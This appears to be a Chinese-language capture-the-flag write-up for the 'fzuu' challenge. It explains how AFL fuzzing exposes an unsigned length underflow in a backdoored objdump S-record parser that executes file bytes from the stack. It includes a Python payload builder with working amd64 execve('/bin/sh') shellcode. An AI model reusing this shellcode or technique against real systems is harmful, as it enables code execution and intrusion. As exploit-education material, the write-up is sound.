# fzuu

## 题目简述

题目提供两个定制版 `objdump`：一个由 `afl-gcc` 插桩，用于发现异常路径；另一个未插桩，用于最终利用。程序基于 binutils 2.37，修改了 Motorola S-record 解析器 `bfd/srec.c`。决定性漏洞是无符号长度下溢触发隐藏的 `srec_scan_helper`，该函数把后续文件字节读入栈缓冲区并直接作为函数执行。

## 解题过程

### 用 AFL 找到入口

题目已经提供插桩二进制和种子，直接让 AFL 把生成文件放到 `@@` 参数位置：

```bash
./afl-fuzz -m none -i fuzz_in -o fuzz_out -- ./objdump_afl -d @@
```

约十几分钟后可得到 `SIGILL` crash。最小样本形如：

```text
00000000: 5331 3030 2d30 ffff 3020  S100-0..0
```

用未插桩的 `objdump` 复现并在 GDB 查看调用栈，崩溃位于 `srec_scan_helper`。这比从整个 binutils 源码盲目审计更快地缩小了范围。

### 解释下溢条件

修改后的 S-record 解析器在记录类型为 `S1` 时把 `min_bytes` 降为 1，又把长度计算改成 `HEX(hdr + 1) + 1`。当头部是 `S100-0` 时，解析流程先执行一次 `--bytes`，随后 `S1` 地址解析又执行 `bytes -= 2`。`bytes` 是无符号 32 位值，于是从 0 下溢为：

```text
0xfffffffe
```

新增的后门条件恰好检测这个值：

```c
if (bytes == 0xfffffffe) {
    srec_scan_helper(abfd);
}
```

辅助函数的关键行为是：

```c
char buf[100];
while ((c = srec_get_byte(abfd, &error)) != EOF)
    buf[lineno++] = c;
((void (*)(void))buf)();
```

因此 `S100-0` 之后的内容就是从栈上执行的 shellcode。

### 构造 payload

把固定触发前缀与无空字节的 amd64 `execve("/bin/sh", ...)` shellcode 拼接：

```python
prefix = bytes.fromhex("53 31 30 30 2d 30")  # b"S100-0"
shellcode = bytes.fromhex(
    "6a4258fec448995248bf2f62696e2f2f7368"
    "57545e4989d04989d20f05"
)
open("objdump-poc", "wb").write(prefix + shellcode)
```

执行：

```bash
./objdump -d objdump-poc
```

程序进入 shell。远程交互时将二进制 payload 用 Base64 传输，避免终端破坏原始字节，读取 `flag.txt` 可得到形如 `flag{FuZzlng_Ls_uSeFuI_IN_Testing_...}` 的结果。

## 方法总结

- 核心技巧：用覆盖率引导模糊测试发现异常输入，再沿 crash 调用栈还原无符号下溢到栈 shellcode 执行的完整链。
- 识别信号：大型解析器、有插桩二进制、文件格式长度字段和不寻常的非法指令崩溃。
- 复用要点：AFL 负责定位而不是解释漏洞；最终必须在未插桩二进制中复现、最小化样本并确认每个算术状态和控制流条件。
